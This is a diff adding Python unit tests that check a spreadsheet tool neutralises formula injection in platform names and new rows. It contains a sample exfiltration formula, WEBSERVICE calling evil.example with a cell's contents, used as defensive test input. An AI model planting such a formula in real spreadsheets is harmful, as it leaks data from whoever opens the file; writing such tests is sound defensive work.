@@ -242,6 +242,34 @@ class TestAddPlatform(XlsxCase):
         self.assertEqual(ws.cell(8, 6).value, TICK)
 
 
+class TestFormulaInjection(XlsxCase):
+    EVIL = '=WEBSERVICE("https://evil.example/?x="&A1)'
+
+    def assertInert(self, cell, expected):
+        self.assertEqual(cell.value, expected)
+        self.assertEqual(cell.data_type, "s")
+
+    def test_add_platform_neutralises_name_and_new_rows(self):
+        new_rows = [{"category": "Sec", "feature": "=SUM(1)", "priority": "+cmd"}]
+        res = mo.add_platform(str(self.src), str(self.out), self.EVIL, {"=SUM(1)": True}, new_rows)
+        self.assertEqual(res["new_rows_added"], 1)
+        self.assertEqual(res["ticks_applied"], 1)  # the sanitised feature is still ticked
+        ws = self.load().active
+        self.assertInert(ws.cell(2, 6), "'" + self.EVIL)
+        self.assertInert(ws.cell(8, 1), "'=SUM(1)")
+        self.assertInert(ws.cell(8, 2), "'+cmd")
+        self.assertEqual(ws.cell(8, 6).value, TICK)
+
+    def test_combo_name_is_neutralised(self):
+        mo.create_combo_column(str(self.src), str(self.out), self.EVIL, "Alpha", "Beta")
+        self.assertInert(self.load().active.cell(2, 6), "'" + self.EVIL)
+
+    def test_existing_formulas_are_left_alone(self):
+        mo.add_platform(str(self.src), str(self.out), "Delta", {})
+        ws = self.load().active
+        self.assertTrue(str(ws.cell(3, 6).value).startswith("=COUNTIF"))
+
+
 class TestReorderColumns(XlsxCase):
     def test_sorted_by_score(self):
         res = mo.reorder_columns_by_score(str(self.src), str(self.out))
